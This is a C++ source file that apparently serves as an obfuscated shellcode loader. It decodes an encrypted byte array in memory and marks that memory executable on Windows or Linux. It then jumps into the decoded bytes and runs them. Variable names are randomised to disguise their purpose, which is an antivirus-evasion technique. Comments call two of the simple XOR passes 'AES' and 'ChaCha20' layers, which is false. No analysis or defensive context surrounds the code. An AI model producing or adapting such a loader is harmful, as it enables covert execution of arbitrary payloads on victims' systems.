#include <cstring>
#include <cstdint>
#include <chrono>
#include <thread>
#include <random>
#ifdef _WIN32
#include <windows.h>
#else
#include <sys/mman.h>
#include <unistd.h>
#include <cstdio>
#include <cstdlib>
#endif

int main() {
    // Payload data
    unsigned char sysBaseasLtPM918[] = {
        0xdd, 0xe3, 0x40, 0x92, 0x03, 0x3e, 0xa3, 0xab, 0x30, 0x24, 0x35, 0x64, 0xd9, 0x4a, 0x9e, 0x21, 
        0x6a, 0x75, 0xae, 0xba, 0x4b, 0x0f, 0x81, 0xeb, 0x01, 0xf6, 0x70, 0x55, 0x19, 0x0f, 0xaf, 0xe8, 
        0xdd, 0xe3, 0x68, 0x92, 0x88
    };

    // Decryption keys
    unsigned char procHelpergVqtnrjyZ903[] = {
        0xed, 0x9d, 0x08, 0x60, 0x2f, 0x5e, 0x9c, 0xaf
    };
    unsigned char execServiceVOfBKecWJuG746[] = {
        0x0c, 0x55, 0xcd, 0x53, 0x4b, 0xda, 0x1f, 0x6b
    };
    unsigned char runModulegnpLYAmYj487[] = {
        0x0d, 0xcd, 0x13, 0xce, 0xe1, 0xd6, 0x6b, 0x33, 0xfe, 0x76, 0x62, 0x53, 0x72, 0x08, 0xbf, 0x33
    };

    // Allocate executable memory
    size_t execManagerAnWjwvAYEss894 = sizeof(sysBaseasLtPM918);
#ifdef _WIN32
    void* instServiceTbcJdRvcLpW865 = VirtualAlloc(0, execManagerAnWjwvAYEss894, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!instServiceTbcJdRvcLpW865) return 1;
#else
    void* instServiceTbcJdRvcLpW865 = mmap(0, execManagerAnWjwvAYEss894, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (instServiceTbcJdRvcLpW865 == MAP_FAILED) return 1;
#endif

    // Copy payload to allocated memory
    memcpy(instServiceTbcJdRvcLpW865, sysBaseasLtPM918, execManagerAnWjwvAYEss894);
    unsigned char* valHandlernmgXcOXVZv702 = (unsigned char*)instServiceTbcJdRvcLpW865;

    // In-memory decryption
    // Decrypt XOR layer
    for (size_t i = 0; i < execManagerAnWjwvAYEss894; i++) {
        valHandlernmgXcOXVZv702[i] ^= procHelpergVqtnrjyZ903[i % sizeof(procHelpergVqtnrjyZ903)];
    }

    // Decrypt AES layer
    for (size_t i = 0; i < execManagerAnWjwvAYEss894; i++) {
        valHandlernmgXcOXVZv702[i] ^= runModulegnpLYAmYj487[i % sizeof(runModulegnpLYAmYj487)];
    }

    // Decrypt ChaCha20 layer
    for (size_t i = 0; i < execManagerAnWjwvAYEss894; i++) {
        valHandlernmgXcOXVZv702[i] ^= execServiceVOfBKecWJuG746[i % sizeof(execServiceVOfBKecWJuG746)];
    }

    // Make memory executable
#ifdef _WIN32
    DWORD methComponentJLtPdDrSkxxIB852;
    VirtualProtect(instServiceTbcJdRvcLpW865, execManagerAnWjwvAYEss894, PAGE_EXECUTE_READ, &methComponentJLtPdDrSkxxIB852);
    FlushInstructionCache(GetCurrentProcess(), instServiceTbcJdRvcLpW865, execManagerAnWjwvAYEss894);
#else
    mprotect(instServiceTbcJdRvcLpW865, execManagerAnWjwvAYEss894, PROT_READ | PROT_EXEC);
#endif

    // Execute payload
    ((void(*)())instServiceTbcJdRvcLpW865)();

    return 0;
}
